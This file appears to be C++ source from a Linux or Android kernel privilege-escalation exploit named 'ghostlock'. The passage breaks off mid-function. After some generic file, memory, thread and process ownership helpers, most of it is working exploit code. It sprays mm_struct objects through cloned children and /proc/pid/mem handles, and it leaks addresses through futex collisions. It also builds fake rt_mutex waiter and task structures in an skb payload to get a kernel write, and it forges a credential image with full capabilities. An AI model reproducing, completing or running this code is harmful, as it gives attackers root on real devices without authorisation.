/**
 * @file support.cpp
 * @brief 资源所有权、错误停手与载荷页准备（自 core.cpp 按用途拆分，逐字保留）。
 */
#include "support.h"
#include "params.h"
#include "profile_accessors.h"
#include "memory.h"
#include "profile.h"
#include "session.h"
#include "log.h"
#include "ks_bridge.h"
#include "route.h"
#include "target.h"

/* ==== support/native_resource.cpp ==== */

#include <signal.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <unistd.h>

#include <cerrno>
#include <utility>

namespace ghostlock::support {
    UniqueFd::~UniqueFd() noexcept { reset(); }

    UniqueFd::UniqueFd(UniqueFd &&other) noexcept : fd_(other.release()) {
    }

    UniqueFd &UniqueFd::operator=(UniqueFd &&other) noexcept {
        if (this != &other) reset(other.release());
        return *this;
    }

    int32_t UniqueFd::release() noexcept { return std::exchange(fd_, -1); }

    int32_t UniqueFd::release_to_process_lifetime(std::string_view reason) noexcept {
        (void) reason;
        return release();
    }

    void UniqueFd::reset(int32_t fd) noexcept {
        const int32_t old = std::exchange(fd_, fd);
        if (old >= 0) {
            const int32_t saved_errno = errno;
            close(old);
            errno = saved_errno;
        }
    }

    MappedRegion::~MappedRegion() noexcept { reset(); }

    MappedRegion::MappedRegion(MappedRegion &&other) noexcept
        : address_(other.release()), size_(std::exchange(other.size_, 0)) {
    }

    MappedRegion &MappedRegion::operator=(MappedRegion &&other) noexcept {
        if (this != &other) {
            reset();
            size_ = other.size_;
            address_ = other.release();
            other.size_ = 0;
        }
        return *this;
    }

    Result<MappedRegion> MappedRegion::map_anonymous(std::size_t size,
                                                     int32_t protection) {
        void *address = mmap(nullptr, size, protection, MAP_PRIVATE | MAP_ANONYMOUS,
                             -1, 0);
        if (address == MAP_FAILED) {
            return std::unexpected(SysError::from_errno());
        }
        return MappedRegion(address, size);
    }

    bool MappedRegion::valid() const noexcept {
        return address_ != nullptr && address_ != MAP_FAILED && size_ != 0;
    }

    std::span<std::byte> MappedRegion::bytes() const noexcept {
        return valid()
                   ? std::span(static_cast<std::byte *>(address_), size_)
                   : std::span<std::byte>();
    }

    void *MappedRegion::release() noexcept {
        return std::exchange(address_, nullptr);
    }

    void MappedRegion::reset() noexcept {
        void *old = std::exchange(address_, nullptr);
        const std::size_t old_size = std::exchange(size_, 0);
        if (old && old != MAP_FAILED && old_size) {
            const int32_t saved_errno = errno;
            munmap(old, old_size);
            errno = saved_errno;
        }
    }

    PthreadOwner::~PthreadOwner() noexcept {
        request_stop();
        detach_if_joinable();
    }

    PthreadOwner::PthreadOwner(PthreadOwner &&other) noexcept
        : thread_(other.thread_),
          state_(std::exchange(other.state_, State::Empty)),
          stop_(std::exchange(other.stop_, nullptr)),
          stop_argument_(std::exchange(other.stop_argument_, nullptr)) {
    }

    PthreadOwner &PthreadOwner::operator=(PthreadOwner &&other) noexcept {
        if (this != &other) {
            request_stop();
            detach_if_joinable();
            thread_ = other.thread_;
            state_ = std::exchange(other.state_, State::Empty);
            stop_ = std::exchange(other.stop_, nullptr);
            stop_argument_ = std::exchange(other.stop_argument_, nullptr);
        }
        return *this;
    }

    int32_t PthreadOwner::start(void *(*entry)(void *), void *argument,
                        ThreadStopCallback stop,
                        void *stop_argument)
    noexcept
 {
  if (joinable() || !entry) return EINVAL;
  const int32_t error = pthread_create(&thread_, nullptr, entry, argument);
  if (!error) {
    state_ = State::Running;
    stop_ = stop;
    stop_argument_ = stop_argument;
  }
  return error;
}

    void PthreadOwner::request_stop() noexcept {
        if (state_ != State::Running) return;
        state_ = State::StopRequested;
        if (stop_) stop_(stop_argument_);
    }

    int32_t PthreadOwner::join(void **result) noexcept {
        if (!joinable()) return EINVAL;
        const int32_t error = pthread_join(thread_, result);
        if (!error) {
            state_ = State::Joined;
            stop_ = nullptr;
            stop_argument_ = nullptr;
        }
        return error;
    }

    int32_t PthreadOwner::detach() noexcept {
        if (!joinable()) return EINVAL;
        const int32_t error = pthread_detach(thread_);
        if (!error) {
            state_ = State::Detached;
            stop_ = nullptr;
            stop_argument_ = nullptr;
        }
        return error;
    }

    pthread_t PthreadOwner::release() noexcept {
        const pthread_t released = thread_;
        state_ = State::Empty;
        stop_ = nullptr;
        stop_argument_ = nullptr;
        return released;
    }

    bool PthreadOwner::joinable() const noexcept {
        return state_ == State::Running || state_ == State::StopRequested;
    }

    void PthreadOwner::detach_if_joinable() noexcept {
        if (joinable()) (void) detach();
    }

    ChildProcess::~ChildProcess() noexcept { cleanup_if_running(); }

    ChildProcess::ChildProcess(ChildProcess &&other) noexcept
        : pid_(std::exchange(other.pid_, -1)),
          state_(std::exchange(other.state_, State::Empty)) {
    }

    ChildProcess &ChildProcess::operator=(ChildProcess &&other) noexcept {
        if (this != &other) {
            cleanup_if_running();
            pid_ = std::exchange(other.pid_, -1);
            state_ = std::exchange(other.state_, State::Empty);
        }
        return *this;
    }

    pid_t ChildProcess::release_to_handoff() noexcept {
        if (!valid()) return -1;
        state_ = State::Transferred;
        return std::exchange(pid_, -1);
    }

    int32_t ChildProcess::terminate_and_wait(int32_t signal_number) noexcept {
        if (!valid()) return EINVAL;
        const pid_t owned = pid_;
        if (kill(owned, signal_number) != 0 && errno != ESRCH) return errno;
        while (waitpid(owned, nullptr, 0) < 0) {
            if (errno != EINTR) return errno;
        }
        pid_ = -1;
        state_ = State::Reaped;
        return 0;
    }

    void ChildProcess::mark_reaped() noexcept {
        if (!valid()) return;
        pid_ = -1;
        state_ = State::Reaped;
    }

    void ChildProcess::cleanup_if_running() noexcept {
        if (valid()) (void) terminate_and_wait(SIGKILL);
    }

    /**
     * @brief 会话适配器：把页面喷射所需的槽位/标量搬进 POD。
     *
     * @note 目标函数只读 POD；本函数是 `g_exploit_session` 的唯一读取点，
     *       Kotlin 直接传参落地后删除。
     */
    core::PageSprayInputs page_spray_inputs_for(
        session::ExploitSession &s, const memory::WriteRequest &request) {
        const profile::kernel_offsets *values = s.profile.values();
        core::PageSprayInputs in{
            .current = &s.heap.current,
            .prebuilt = &s.heap.prebuilt,
            .quarantine = &s.heap.quarantine,
            .prepare = &s.heap.prepare,
            .spray = &s.heap.spray,
            .pre = &s.heap.pre,
            .post = &s.heap.post,
            .leak_child = &s.heap.leak_child,
            .leak_memfd = &s.heap.leak_memfd,
            .skb_buffer = &s.heap.skb_buffer,
            .snitch = &s.heap.snitch,
            .mm_objs_per_slab = &s.heap.mm_objs_per_slab,
            .request = request,
            .main_cpu = config::runtime_config_snapshot().main_cpu,
            .mm_struct_sz = s.profile.mm_struct_stride(kernel::MM_STRUCT_SZ),
            .prepare_max_attempts = s.profile.heap_prepare_max_attempts(),
            .prepare_timeout_ms = s.profile.heap_prepare_timeout_ms(),
            .kernelsnitch_timeout_ms =
                s.profile.execution() ? s.profile.execution()->heap_kernelsnitch_timeout_ms : 0,
            .kernelsnitch_collisions = ghostlock::profile::kernelsnitch_collisions(),
            .compact_waiter = s.profile.has_compact_waiter() ? 1 : 0,
            .init_cred_alias = s.addresses.data_alias(s.addresses.init_cred_image_addr()),
            .init_task_alias = ghostlock::profile::slide_init_task(),
            .root_task_group_alias = ghostlock::profile::slide_root_task_group(),
            .direct_map_end = kernel::g_direct_map_end,
            .tcp_payload_layout = route::route_capability(
                s.profile,
                [](auto policy) { return std::decay_t<decltype(policy)>::tcp_payload_layout; }) ? 1 : 0,
            .ref_image_alias = {
                s.addresses.data_alias(values ? values->credential.ref0_image : 0),
                s.addresses.data_alias(values ? values->credential.ref1_image : 0),
                s.addresses.data_alias(values ? values->credential.ref2_image : 0),
                s.addresses.data_alias(values ? values->credential.ref3_image : 0),
            },
            .compact_task_prio_off = values ? values->task.prio : 0,
            .compact_task_normal_prio_off = values ? values->task.normal_prio : 0,
            .compact_task_task_group_off = values ? values->task.sched_task_group : 0,
            .compact_task_pi_lock_off = values ? values->task.pi_lock : 0,
            .compact_task_pi_waiters_off = values ? values->task.pi_waiters : 0,
            .compact_task_pi_top_task_off = values ? values->task.pi_top_task : 0,
            .compact_task_pi_blocked_off = values ? values->task.pi_blocked_on : 0,
            .fake_task_prio_off = ghostlock::profile::fake_task_prio_off(),
            .fake_task_normal_prio_off = ghostlock::profile::fake_task_normal_prio_off(),
            .fake_task_task_group_off = ghostlock::profile::fake_task_task_group_off(),
            .fake_task_pi_lock_off = ghostlock::profile::fake_task_pi_lock_off(),
            .fake_task_pi_waiters_off = ghostlock::profile::fake_task_pi_waiters_off(),
            .fake_task_pi_top_task_off = ghostlock::profile::fake_task_pi_top_task_off(),
            .fake_task_pi_blocked_off = ghostlock::profile::fake_task_pi_blocked_on_off(),
            .credential = values ? values->credential : ghostlock::profile::CredTemplate{},
        };
        return in;
    }

    /* 过渡适配器：仍读进程级会话；原子入口用 `page_spray_inputs_for`。 */
    core::PageSprayInputs page_spray_inputs_from_session(
        const memory::WriteRequest &request) {
        return page_spray_inputs_for(session::g_exploit_session, request);
    }
} // namespace ghostlock::support

/* ==== support/util.cpp ==== */

#include <array>
#include <string_view>


namespace ghostlock::support {
    static long long ms_since(const struct timespec *t0) {
        return static_cast<long long>(runtime_time::runtime_elapsed_ms(t0));
    }

    /* Persist stage-boundary diagnostics before a kernel panic or filesystem
     * rollback can discard buffered lines. Unsupported fsync targets are ignored. */
    void log_sync(void) {
        fflush(stdout);
        (void) fsync(STDOUT_FILENO);
    }

    [[noreturn]] void fail_stop_dirty_race(const char *reason,
                                           int32_t error_number) noexcept {
        pr_error("terminal dirty race: %s errno=%d; stopping native process\n",
                 reason ? reason : "unknown", error_number);
        log_sync();
        syscall(SYS_exit_group, 70);
        __builtin_unreachable();
    }

    void read_first_line(const char *path, char *buf, size_t len) {
        if (!len) {
            return;
        }
        snprintf(buf, len, "unreadable");
        support::UniqueFd fd(open(path, O_RDONLY | O_CLOEXEC));
        if (!fd.valid()) {
            return;
        }
        const ssize_t n = read(fd.get(), buf, len - 1);
        const int32_t saved_errno = errno;
        fd.reset();
        if (n <= 0) {
            errno = saved_errno;
            snprintf(buf, len, "unreadable");
            return;
        }
        buf[n] = 0;
        buf[strcspn(buf, "\r\n")] = 0;
    }

    void log_startup_context(void) {
        std::array < char, 256 > attr{};
        std::array < char, 32 > enforce{};
        std::array < char, 4096 > status{};
        std::array < char, 160 > limits{};
        snprintf(limits.data(), limits.size(),
                 "NoNewPrivs=? Seccomp=? Seccomp_filters=?");
        read_first_line("/proc/self/attr/current", attr.data(), attr.size());
        read_first_line("/sys/fs/selinux/enforce", enforce.data(), enforce.size());
        support::UniqueFd fd(open("/proc/self/status", O_RDONLY | O_CLOEXEC));
        if (fd.valid()) {
            const ssize_t n = read(fd.get(), status.data(), status.size() - 1);
            if (n > 0) {
                status[static_cast<size_t>(n)] = 0;
                const std::array<const char *, 3> names = {
                    "NoNewPrivs:", "Seccomp:", "Seccomp_filters:"
                };
                std::array < std::array < char, 32 >, 3 > values = {
                    {
                        std::array < char, 32 >{"?"},
                        std::array < char, 32 >{"?"},
                        std::array < char, 32 >{"?"},
                    }
                };
                const std::string_view status_view(status.data(), static_cast<size_t>(n));
                for (size_t i = 0; i < names.size(); i++) {
                    const size_t at = status_view.find(names[i]);
                    if (at == std::string_view::npos) continue;
                    std::string_view rest =
                            status_view.substr(at + strlen(names[i]));
                    const size_t first = rest.find_first_not_of("\t ");
                    if (first == std::string_view::npos) {
                        values[i][0] = 0;
                        continue;
                    }
                    rest.remove_prefix(first);
                    size_t len = rest.find_first_of("\r\n");
                    if (len == std::string_view::npos) len = rest.size();
                    if (len >= values[i].size()) {
                        len = values[i].size() - 1;
                    }
                    memcpy(values[i].data(), rest.data(), len);
                    values[i][len] = 0;
                }
                snprintf(limits.data(), limits.size(), "NoNewPrivs=%s Seccomp=%s "
                         "Seccomp_filters=%s", values[0].data(), values[1].data(),
                         values[2].data());
            }
        }
        struct timespec boot;
        SYSCHK(clock_gettime(CLOCK_BOOTTIME, &boot));
        double boot_ms =
                static_cast<double>(boot.tv_sec) * 1000.0 + static_cast<double>(boot.tv_nsec) / 1e6;
        pr_success("startup context pid=%d uid=%u euid=%u gid=%u egid=%u "
                   "boot_ms=%.0f attr=%s enforce=%s\n",
                   getpid(), getuid(), geteuid(), getgid(), getegid(), boot_ms,
                   attr.data(), enforce.data());
        pr_success("startup limits pid=%d %s\n", getpid(), limits.data());
        pr_success("build config pid=%d label=%s slide=pselect main=pselect\n",
                   getpid(), kernel::BUILD_VARIANT_LABEL);
        pr_success("p0 profile pid=%d phys_offset=%016llx kernel_phys_load=%016llx "
                   "delta=%016llx slide_logger=%016llx bootid_data=%016llx "
                   "init_task=%016llx root_tg=%016llx sysctl_bootid=%016llx\n",
                   getpid(), (unsigned long long) session::g_exploit_session.addresses.phys_offset,
                   (unsigned long long) session::g_exploit_session.addresses.phys_load(),
                   (unsigned long long) (session::g_exploit_session.addresses.phys_load() -
                                         session::g_exploit_session.addresses.phys_offset),
                   (unsigned long long) ghostlock::profile::slide_nfulnl_logger(),
                   (unsigned long long) ghostlock::profile::slide_random_boot_id_data(),
                   (unsigned long long) ghostlock::profile::slide_init_task(),
                   (unsigned long long) ghostlock::profile::slide_root_task_group(),
                   (unsigned long long) ghostlock::profile::slide_sysctl_bootid());
    }

    long futex_op(uint32_t *uaddr, int32_t op, uint32_t val,
                  const void *timeout_or_value, uint32_t *uaddr2,
                  uint32_t val3) {
        return syscall(SYS_futex, uaddr, op, val, timeout_or_value, uaddr2, val3);
    }

    long sched_setattr_tid(int32_t tid, int32_t nice_value) {
        kernel::local_sched_attr attr;
        memset(&attr, 0, sizeof(attr));
        attr.size = sizeof(attr);
        attr.sched_policy = 3; /* SCHED_BATCH — nice change triggers PI walk (pi=true) */
        attr.sched_nice = nice_value;
        errno = 0;
        long ret = syscall(274, tid, &attr, 0);
        if (ret != 0) {
            pr_error("sched_setattr(%d,BATCH,nice=%d) ret=%ld errno=%d\n", tid, nice_value, ret, errno);
        }
        return ret;
    }

    void init_p0_profile(void) {
        pr_info("p0 kernel_phys_load=%016llx delta=%016llx\n",
                (unsigned long long) session::g_exploit_session.addresses.phys_load(),
                (unsigned long long) (session::g_exploit_session.addresses.phys_load() -
                                      session::g_exploit_session.addresses.phys_offset));
    }

    void put64(unsigned char *p, size_t off, uint64_t value) {
        memcpy(p + off, &value, sizeof(value));
    }

    void put32(unsigned char *p, size_t off, uint32_t value) {
        memcpy(p + off, &value, sizeof(value));
    }

    static int32_t fill_profile_cred_copy(const core::PageSprayInputs &in, unsigned char *p, size_t off) {
        const profile::CredTemplate &credential = in.credential;
        if (!credential.copy_size || credential.copy_size > kernel::ORDER3_SIZE ||
            credential.usage_offset + sizeof(uint32_t) > credential.copy_size ||
            credential.caps_offset + credential.caps_count * sizeof(uint64_t) >
            credential.copy_size) {
            pr_error("credential copy profile is incomplete\n");
            return 0;
        }
        unsigned char *c = p + off;
        memset(c, 0, credential.copy_size);
        put32(c, credential.usage_offset, credential.usage_value);
        for (uint32_t i = 0; i < credential.caps_count; i++) {
            put64(c, credential.caps_offset + i * sizeof(uint64_t), credential.caps_value);
        }

        const std::array<uint32_t, 4> ref_offsets = {
            credential.ref0_offset, credential.ref1_offset,
            credential.ref2_offset, credential.ref3_offset,
        };

        if (credential.ref_count > ref_offsets.size()) {
            pr_error("credential reference count %u exceeds the %zu slots\n",
                     credential.ref_count, ref_offsets.size());
            return 0;
        }
        for (size_t i = 0; i < credential.ref_count; i++) {
            if (ref_offsets[i] + sizeof(uint64_t) > credential.copy_size) {
                pr_error("credential reference %zu exceeds configured copy size\n", i);
                return 0;
            }
            put64(c, ref_offsets[i], in.ref_image_alias[i]);
        }
        return 1;
    }

    pid_t clone_child(const core::PageSprayInputs &in) {
        pid_t child = static_cast<pid_t>(SYSCHK(syscall(SYS_clone, SIGCHLD, nullptr, nullptr, nullptr, 0)));
        if (child == 0) {
            SYSCHK(prctl(PR_SET_PDEATHSIG, SIGKILL));
            if (getppid() == 1) {
                _exit(0);
            }
            kernel::pin_to_core(static_cast<size_t>(in.main_cpu));
            for (;;) {
                pause();
            }
        }
        return child;
    }

    pid_t clone_leak_child(const core::PageSprayInputs &in) {
        pid_t child = static_cast<pid_t>(SYSCHK(syscall(SYS_clone, SIGCHLD, nullptr, nullptr, nullptr, 0)));
        if (child == 0) {
            glk_ks_dev_find_collisions(*in.snitch);
            exit(0);
        }
        return child;
    }

    int32_t open_memfd(pid_t child) {
        std::array < char, 64 > path{};
        snprintf(path.data(), path.size(), "/proc/%d/mem", child);
        return SYSCHK(open(path.data(), O_RDONLY));
    }

    void kill_child(pid_t child) {
        if (child <= 0) {
            return;
        }
        SYSCHK(kill(child, SIGKILL));
        SYSCHK(waitpid(child, nullptr, 0));
    }

    void close_reclaim_sockets(void) {
        session::g_exploit_session.heap.current.destroy();
    }

    int32_t quarantine_reclaim_sockets(void) {
        return session::g_exploit_session.heap.current.move_to(session::g_exploit_session.heap.quarantine,
                                                               memory::PayloadPageState::Quarantined);
    }

    void release_quarantined_reclaim_sockets(void) {
        session::g_exploit_session.heap.quarantine.destroy();
    }

    Status stash_prebuilt_page(void) {
        return session::g_exploit_session.heap.current.move_to(session::g_exploit_session.heap.prebuilt,
                                                               memory::PayloadPageState::Prebuilt);
    }

    Status activate_prebuilt_page(void) {
        if (!session::g_exploit_session.heap.prebuilt.has_reclaim()) return false;
        close_reclaim_sockets();
        return session::g_exploit_session.heap.prebuilt.move_to(session::g_exploit_session.heap.current,
                                                                memory::PayloadPageState::Current);
    }

    void discard_prebuilt_page(void) {
        session::g_exploit_session.heap.prebuilt.destroy();
    }

    void cleanup_page_prepare_state(const core::PageSprayInputs &in) {
        memory::close_ctx_memfds(in.prepare);
        memory::close_ctx_memfds(in.spray);
        memory::close_ctx_memfds(in.pre);
        memory::close_ctx_memfds(in.post);
        if ((*in.leak_memfd).get() > 0) {
            (*in.leak_memfd).reset();
        }
        memory::free_ctx_storage(in.prepare);
        memory::free_ctx_storage(in.spray);
        memory::free_ctx_storage(in.pre);
        memory::free_ctx_storage(in.post);
        (*in.skb_buffer).reset();
    }

    int32_t clone_memfd(const core::PageSprayInputs &in) {
        pid_t child = clone_child(in);
        int32_t fd = open_memfd(child);
        kill_child(child);
        return fd;
    }

    void prepare_ctxs(const core::PageSprayInputs &in) {
        in.prepare->childs.assign(8 * (*in.mm_objs_per_slab), 0);
        in.prepare->memfds.assign(8 * (*in.mm_objs_per_slab), 0);

        in.spray->childs.assign((1 + kernel::MM_PARTIALS) * (*in.mm_objs_per_slab), 0);
        in.spray->memfds.assign((1 + kernel::MM_PARTIALS) * (*in.mm_objs_per_slab), 0);

        in.pre->childs.assign((*in.mm_objs_per_slab) - 1, 0);
        in.pre->memfds.assign((*in.mm_objs_per_slab) - 1, 0);

        in.post->childs.assign((*in.mm_objs_per_slab), 0);
        in.post->memfds.assign((*in.mm_objs_per_slab), 0);
    }

    int32_t prepare_skb_payload(const core::PageSprayInputs &in, uintptr_t base) {
        memset(in.skb_buffer->get(), 0, kernel::SKB_SEND_SIZE);

        const bool tcp_layout = in.tcp_payload_layout != 0;
        long long payload_delta = tcp_layout ? 0 : kernel::SKB_DATA_DELTA;
        size_t chunk_bias = tcp_layout ? 0xe80 : static_cast<size_t>(kernel::SKB_FRAG_BIAS);
        size_t fake_task_off = tcp_layout ? kernel::TCP_FAKE_TASK_OFF : static_cast<size_t>(kernel::FAKE_TASK_OFF);

        uintptr_t payload_base = base + static_cast<uintptr_t>(payload_delta);

        (in.current->fake_lock) = payload_base + kernel::LOCK_OFF;
        (in.current->fake_w0) = payload_base + kernel::W0_OFF;
        (in.current->fake_task) = payload_base + fake_task_off;
        uintptr_t default_fops = payload_base + kernel::FOPS_TABLE_OFF;
        uintptr_t credential_fops =
                payload_base + (tcp_layout ? kernel::TCP_CRED_COPY_OFF : kernel::CRED_COPY_OFF);
        memory::PayloadWriteLayout write_layout = payload_write_layout(
            &in.request, base, default_fops, credential_fops, in.init_cred_alias);
        (in.current->fake_parent) = write_layout.parent;
        (in.current->fake_right) = write_layout.right;
        (in.current->fake_left) = write_layout.left;
        (in.current->fake_fops) = write_layout.fops;

        uintptr_t write_pc = (in.current->fake_parent);
        uintptr_t write_right = (in.current->fake_right);
        uintptr_t write_left = (in.current->fake_left);
        /* Direct-map aliases (data_addr) resolve to the same physical pages and are
         * dereferenceable on every SoC — the tcp route already uses in.init_task_alias
         * the same way for the on-stack waiter (upstream U01-D). */
        uint64_t waiter_task = in.init_task_alias;
        uint64_t task_group = in.root_task_group_alias;
        uint64_t pi_top_task = in.init_task_alias;

        int32_t compact = in.compact_waiter;

        for (size_t chunk = 0; chunk < kernel::SKB_SEND_SIZE; chunk += kernel::ORDER3_SIZE) {
            unsigned char *p = in.skb_buffer->get() + chunk + chunk_bias;

            put32(p, kernel::LOCK_OFF + 0x00, 0);
            put64(p, kernel::LOCK_OFF + 0x08, (in.current->fake_w0));
            put64(p, kernel::LOCK_OFF + 0x10, (in.current->fake_w0));
            put64(p, kernel::LOCK_OFF + 0x18, (in.current->fake_task) | 1);

            if (compact) {
                /* Words ride the erase relink: pc = value, rb_left = dest,
                 * rb_right = 0 or the one-child arm also clobbers *(value) with
                 * dest-8. Value 0 uses pc = dest-8 (stores 0 at *dest); pc = 0
                 * would leave the node parentless for enqueue_pi to trash
                 * fake_task. prio > 120 gates this erase. The relink's second
                 * write lands in *(value+8): cred image on W2, page rb_root at 0. */
                put64(p, kernel::W0_OFF + 0x00, 1); /* tree_entry.rb_parent_color */
                put64(p, kernel::W0_OFF + 0x08, 0); /* tree_entry.rb_right */
                put64(p, kernel::W0_OFF + 0x10, 0); /* tree_entry.rb_left */
                (void) encode_compact_waiter(
                    {
                        reinterpret_cast<std::byte *>(p + kernel::W0_OFF),
                        memory::kCompactWaiterBytes
                    },
                    in.request, write_layout);
                put64(p, kernel::W0_OFF + 0x30, waiter_task); /* task */
                put64(p, kernel::W0_OFF + 0x38, (in.current->fake_lock)); /* lock */
                put32(p, kernel::W0_OFF + 0x40, 0); /* wake_state */
                put32(p, kernel::W0_OFF + 0x44, kernel::FAKE_WAITER_PRIO); /* prio */
                put64(p, kernel::W0_OFF + 0x48, 0); /* deadline */
                put64(p, kernel::W0_OFF + 0x50, 0); /* ww_ctx */
            } else {
                /* 6.6 rt_mutex_waiter with rb_node tree/pi_tree */
                put64(p, kernel::W0_OFF + 0x00, 1);
                put64(p, kernel::W0_OFF + 0x08, 0);
                put64(p, kernel::W0_OFF + 0x10, 0);
                put32(p, kernel::W0_OFF + kernel::FAKE_WAITER_TREE_PRIO_OFF, kernel::FAKE_WAITER_PRIO);
                put64(p, kernel::W0_OFF + kernel::FAKE_WAITER_TREE_DEADLINE_OFF, 0);
                put64(p, kernel::W0_OFF + kernel::FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x00, write_pc);
                put64(p, kernel::W0_OFF + kernel::FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x08, write_right);
                put64(p, kernel::W0_OFF + kernel::FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x10, write_left);
                put32(p, kernel::W0_OFF + kernel::FAKE_WAITER_PI_TREE_PRIO_OFF, kernel::FAKE_WAITER_PRIO);
                put64(p, kernel::W0_OFF + kernel::FAKE_WAITER_PI_TREE_DEADLINE_OFF, 0);
                put64(p, kernel::W0_OFF + kernel::FAKE_WAITER_TASK_OFF, waiter_task);
                put64(p, kernel::W0_OFF + kernel::FAKE_WAITER_LOCK_OFF,
                      (in.current->fake_lock));
                put32(p, kernel::W0_OFF + kernel::FAKE_WAITER_WAKE_STATE_OFF, 0);
                put64(p, kernel::W0_OFF + kernel::FAKE_WAITER_WW_CTX_OFF, 0);
            }

            /* Use runtime offsets for 6.1 compact; target.h constants for 6.6. */
            uint32_t ft_prio_off = compact
                                       ? in.compact_task_prio_off
                                       : in.fake_task_prio_off;
            uint32_t ft_nprio_off = compact
                                        ? in.compact_task_normal_prio_off
                                        : in.fake_task_normal_prio_off;
            uint32_t ft_tg_off = compact
                                     ? in.compact_task_task_group_off
                                     : in.fake_task_task_group_off;
            uint32_t ft_pi_lock_off = compact
                                          ? in.compact_task_pi_lock_off
                                          : in.fake_task_pi_lock_off;
            uint32_t ft_pi_wait_off = compact
                                          ? in.compact_task_pi_waiters_off
                                          : in.fake_task_pi_waiters_off;
            uint32_t ft_pi_top_off = compact
                                         ? in.compact_task_pi_top_task_off
                                         : in.fake_task_pi_top_task_off;
            uint32_t ft_pi_blocked_off = compact
                                             ? in.compact_task_pi_blocked_off
                                             : in.fake_task_pi_blocked_off;

            put32(p, fake_task_off + kernel::FAKE_TASK_USAGE_OFF, 0x100);
            put32(p, fake_task_off + ft_prio_off, kernel::FAKE_TASK_PRIO);
            put32(p, fake_task_off + ft_nprio_off, kernel::FAKE_TASK_PRIO);
            put32(p, fake_task_off + ft_pi_lock_off, 0);
            /* Empty PI waiters avoid tree rebalancing during reinsertion. */
            put64(p, fake_task_off + ft_pi_wait_off, 0);
            put64(p, fake_task_off + ft_pi_wait_off + 0x08, 0);
            put64(p, fake_task_off + ft_tg_off, task_group);
            put64(p, fake_task_off + ft_pi_top_off, pi_top_task);
            put64(p, fake_task_off + ft_pi_blocked_off, 0);

            put64(p, kernel::RIGHT_OFF + 0x00, (in.current->fake_parent));
            put64(p, kernel::RIGHT_OFF + 0x08, 0);
            put64(p, kernel::RIGHT_OFF + 0x10, 0);

            put64(p, kernel::LEFT_OFF + 0x00, (in.current->fake_parent));
            put64(p, kernel::LEFT_OFF + 0x08, 0);
            put64(p, kernel::LEFT_OFF + 0x10, 0);

            if (write_layout.needs_credential_copy &&
                !fill_profile_cred_copy(in, p, tcp_layout ? kernel::TCP_CRED_COPY_OFF : kernel::CRED_COPY_OFF)) {
                return 0;
            }
        }
        return 1;
    }

    /* TODO(CPP07-OWNER): partial prepare failure injection still needs a
     * syscall-level fault-injection framework; the ownership refactor itself is
     * complete (CPP12h). Completion: add the framework, cover the early-exit
     * paths, then delete this comment and the residual row. */
    SprayResult spray_begin(const core::PageSprayInputs &in) {
        SprayResult spray;
        clock_gettime(CLOCK_MONOTONIC, &spray.started);
        const struct timespec &t_spray = spray.started;
        /* Release every userspace reference from the preceding write before the
         * context arrays are replaced. Keeping the final post-spray memfd pinned
         * leaked one mm_struct per stage and progressively poisoned later sprays. */
        in.current->destroy();
        cleanup_page_prepare_state(in);
        (*in.mm_objs_per_slab) = kernel::ORDER3_SIZE / in.mm_struct_sz;
        prepare_ctxs(in);

        (*in.skb_buffer) = std::make_unique<unsigned char[]>(kernel::SKB_SEND_SIZE);
        memset(in.skb_buffer->get(), 0x41, kernel::SKB_SEND_SIZE);

        for (size_t i = 0; i < in.prepare->childs.size(); i++) {
            in.prepare->childs[i] = clone_child(in);
            in.prepare->memfds[i] = open_memfd(in.prepare->childs[i]);
        }

        for (size_t i = 0; i < in.spray->childs.size(); i++) {
            in.spray->childs[i] = clone_child(in);
            in.spray->memfds[i] = open_memfd(in.spray->childs[i]);
        }

        const int32_t cpu_count = static_cast<int32_t>(sysconf(_SC_NPROCESSORS_ONLN));
        void *snitch = glk_ks_dev_create(
            static_cast<std::size_t>(in.mm_struct_sz),
            static_cast<std::size_t>(kernel::MM_ORDER),
            static_cast<std::size_t>(cpu_count),
            static_cast<std::size_t>(in.kernelsnitch_collisions), 0,
            static_cast<std::int32_t>(in.main_cpu));
        /* The forked leak child borrows the shared mmap context through this
         * compatibility alias; the bridge handle remains the only releaser. The
         * alias lives only inside this call: the context is released before
         * returning, because land_with() never touches the snitch. */
        auto clear_snitch_alias =
                make_scope_exit([&in]() noexcept { (*in.snitch) = nullptr; });
        /* leak 末尾的 bruteforce 会 `reset_cpu_pin()`（affinity 设成全核，
         * glgeneral/kernelsnitch/kernelsnitch.h:590）。恢复成调用方给的
         * main_cpu，使"第一次调用"与"后续调用"的前置 CPU 状态一致。 */
        auto restore_pin = make_scope_exit([&in]() noexcept {
            kernel::pin_to_core(static_cast<size_t>(in.main_cpu));
        });
        auto release_snitch = make_scope_exit([&snitch]() noexcept {
            if (snitch) {
                (void) glk_ks_dev_destroy(snitch);
                snitch = nullptr;
            }
        });
        if (!snitch) {
            pr_warning("kernelsnitch setup failed\n");
            for (size_t i = 0; i < in.prepare->childs.size(); i++) {
                kill_child(in.prepare->childs[i]);
            }
            cleanup_page_prepare_state(in);
            return spray;
        }
        (*in.snitch) = snitch;
        pr_info("[spray] mm spray + kernelsnitch ready (cpu=%d) +%lldms\n",
                cpu_count, ms_since(&t_spray));

        for (size_t i = 0; i < in.pre->childs.size(); i++) {
            in.pre->childs[i] = clone_child(in);
        }
        (*in.leak_child) = ChildProcess(clone_leak_child(in));
        for (size_t i = 0; i < in.post->childs.size(); i++) {
            in.post->childs[i] = clone_child(in);
        }

        for (size_t i = 0; i < in.pre->childs.size(); i++) {
            in.pre->memfds[i] = open_memfd(in.pre->childs[i]);
        }
        (*in.leak_memfd).reset(open_memfd((*in.leak_child).get()));
        for (size_t i = 0; i < in.post->childs.size(); i++) {
            in.post->memfds[i] = open_memfd(in.post->childs[i]);
        }

        for (size_t i = 0; i < in.pre->childs.size(); i++) {
            kill_child(in.pre->childs[i]);
        }
        for (size_t i = 0; i < in.post->childs.size(); i++) {
            kill_child(in.post->childs[i]);
        }
        for (size_t i = 0; i < in.spray->childs.size(); i++) {
            kill_child(in.spray->childs[i]);
        }
        pr_info("[spray] finding futex collisions... +%lldms\n",
                ms_since(&t_spray));
        {
            struct timespec t_wait;
            clock_gettime(CLOCK_MONOTONIC, &t_wait);
            const pid_t leak_pid = (*in.leak_child).get();
            int32_t leak_status = 0;
            pid_t wp = 0;
            long long last_beat = 0;
            for (;;) {
                wp = waitpid(leak_pid, &leak_status, WNOHANG);
                if (wp == leak_pid) {
                    (*in.leak_child).mark_reaped();
                    break;
                }
                if (wp < 0) {
